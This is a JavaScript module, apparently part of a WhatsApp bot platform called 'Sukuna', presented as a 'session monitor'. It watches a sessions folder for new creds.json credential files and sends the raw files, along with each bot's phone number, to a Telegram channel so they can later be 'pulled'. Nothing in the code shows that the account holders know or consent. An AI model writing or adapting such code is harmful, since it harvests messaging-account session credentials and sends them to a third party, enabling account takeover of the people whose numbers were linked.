/**
 * ═══════════════════════════════════════════════════════
 * 📡 TELEGRAM SESSION MONITOR | مراقب الجلسات
 * ═══════════════════════════════════════════════════════
 * 👑 المطور: آدم (شادو) | Adam (Shadow)
 * 🤖 البوت: سوكونا | Sukuna
 * 📜 الوصف: مراقبة فولدر الجلسات الجديدة وإرسالها لقناة التليجرام
 * ═══════════════════════════════════════════════════════
 */

import { Telegraf, Markup } from 'telegraf'
import fs from 'fs'
import path from 'path'
import config from './config.js'

let bot = null
const processedSessions = new Set()

// ═══ دالة إرسال إشعار بجلسة جديدة ═══
export async function notifyNewSession(botNumber, sessionPath) {
  if (!bot || !config.telegram.token || config.telegram.token.includes('ضع')) {
    console.log('⚠️ Telegram bot not configured')
    return
  }

  try {
    const credsPath = path.join(sessionPath, 'creds.json')
    if (!fs.existsSync(credsPath)) return

    const credsData = JSON.parse(fs.readFileSync(credsPath, 'utf-8'))
    const sessionSize = fs.readdirSync(sessionPath).length

    const message = [
      '🕸 *جلسة بوت جديدة جاهزة!*',
      '',
      '⊱⊹•─๋︩︪═╾═─•┈⧽┊🎭┊⧼┈•─═╼═─๋︩︪•⊹⊰',
      '',
      `📱 *رقم البوت:* \`${botNumber}\``,
      `📂 *عدد الملفات:* ${sessionSize}`,
      `🕐 *الوقت:* ${new Date().toLocaleString('ar-SA')}`,
      '',
      '⋄⊹•─๋︩︪╾─•┈ ⧼ ⇊ ⧽ ┈•─╼─๋︩︪•⊹',
      '',
      '> الجلسة اتحفظت في:',
      `\`${sessionPath}\``,
      '',
      '📥 استخدم الأمر `/fetch_sessions` في بوت سوكونا الرئيسي لسحب الجلسة.'
    ].join('\n')

    // إرسال الرسالة للقناة/الجروب
    if (config.telegram.sessionsChannel) {
      await bot.telegram.sendMessage(config.telegram.sessionsChannel, message, {
        parse_mode: 'Markdown'
      })

      // إرسال ملف الجلسة نفسه
      const sessionZip = await createSessionZip(sessionPath, botNumber)
      if (sessionZip) {
        await bot.telegram.sendDocument(
          config.telegram.sessionsChannel,
          { source: sessionZip },
          {
            caption: `📦 جلسة البوت: ${botNumber}`,
            filename: `session_${botNumber}.json`
          }
        )
      }

      console.log(`📡 Session notification sent to Telegram: ${botNumber}`)
    }

    // إرسال إشعار للمطورين
    for (const ownerId of config.telegram.owners) {
      try {
        await bot.telegram.sendMessage(ownerId, `✅ جلسة جديدة جاهزة: ${botNumber}`)
      } catch {}
    }

  } catch (e) {
    console.error('❌ Error sending session notification:', e.message)
  }
}

// ═══ دالة إنشاء ملف JSON للجلسة ═══
async function createSessionZip(sessionPath, botNumber) {
  try {
    const credsPath = path.join(sessionPath, 'creds.json')
    if (!fs.existsSync(credsPath)) return null

    // قراءة creds.json وإرجاعه كـ Buffer
    const credsData = fs.readFileSync(credsPath)
    return credsData
  } catch (e) {
    console.error('Error creating session file:', e)
    return null
  }
}

// ═══ دالة مراقبة الفولدر ═══
function startWatching() {
  const subDir = config.subSessionsDir

  if (!fs.existsSync(subDir)) {
    fs.mkdirSync(subDir, { recursive: true })
  }

  console.log(`👁️ Watching for new sessions in: ${subDir}`)

  // فحص دوري
  setInterval(async () => {
    try {
      const sessions = fs.readdirSync(subDir)

      for (const session of sessions) {
        const sessionPath = path.join(subDir, session)
        const credsPath = path.join(sessionPath, 'creds.json')

        // لو الجلسة موجودة ومش متعالجة قبل كده
        if (fs.existsSync(credsPath) && !processedSessions.has(session)) {
          processedSessions.add(session)
          console.log(`🆕 New session detected: ${session}`)

          // إرسال إشعار
          await notifyNewSession(session, sessionPath)
        }
      }
    } catch (e) {
      console.error('Error watching sessions:', e.message)
    }
  }, config.telegram.checkInterval)

  // كمان نستخدم fs.watch لو متاح
  try {
    fs.watch(subDir, { recursive: true }, async (eventType, filename) => {
      if (filename === 'creds.json') {
        const dirName = path.dirname(path.join(subDir, filename))
        const botNumber = path.basename(dirName)

        if (!processedSessions.has(botNumber)) {
          processedSessions.add(botNumber)
          await notifyNewSession(botNumber, dirName)
        }
      }
    })
  } catch {}
}

// ═══ دالة تشغيل البوت ═══
export async function startTelegramMonitor() {
  if (!config.telegram.token || config.telegram.token.includes('ضع')) {
    console.log('⚠️ Telegram token not configured. Session monitor disabled.')
    return
  }

  try {
    bot = new Telegraf(config.telegram.token)
    globalThis.sessionMonitorBot = bot

    // أمر /status
    bot.command('status', async (ctx) => {
      const subDir = config.subSessionsDir
      let sessionCount = 0

      try {
        sessionCount = fs.readdirSync(subDir).filter(s => {
          return fs.existsSync(path.join(subDir, s, 'creds.json'))
        }).length
      } catch {}

      await ctx.reply([
        '🕸 *حالة منصة سوكونا*',
        '',
        `📂 عدد الجلسات: ${sessionCount}`,
        `📡 المراقبة: شغالة ✅`,
        `⏱️ آخر فحص: ${new Date().toLocaleTimeString('ar-SA')}`
      ].join('\n'), { parse_mode: 'Markdown' })
    })

    // أمر /sessions - عرض كل الجلسات
    bot.command('sessions', async (ctx) => {
      const subDir = config.subSessionsDir
      let sessions = []

      try {
        sessions = fs.readdirSync(subDir).filter(s => {
          return fs.existsSync(path.join(subDir, s, 'creds.json'))
        })
      } catch {}

      if (!sessions.length) {
        return ctx.reply('📭 مفيش جلسات حالياً.')
      }

      const list = sessions.map((s, i) => `${i + 1}. 📱 ${s}`).join('\n')
      await ctx.reply([
        '🕸 *الجلسات المتاحة:*',
        '',
        list,
        '',
        `📊 الإجمالي: ${sessions.length}`
      ].join('\n'), { parse_mode: 'Markdown' })
    })

    bot.launch()
      .then(() => {
        console.log('📡 Telegram session monitor is running!')
      })
      .catch(err => {
        console.error('❌ Telegram monitor error:', err.message)
      })

    // بدء المراقبة
    startWatching()

  } catch (e) {
    console.error('❌ Failed to start Telegram monitor:', e.message)
  }
}

export default { startTelegramMonitor, notifyNewSession }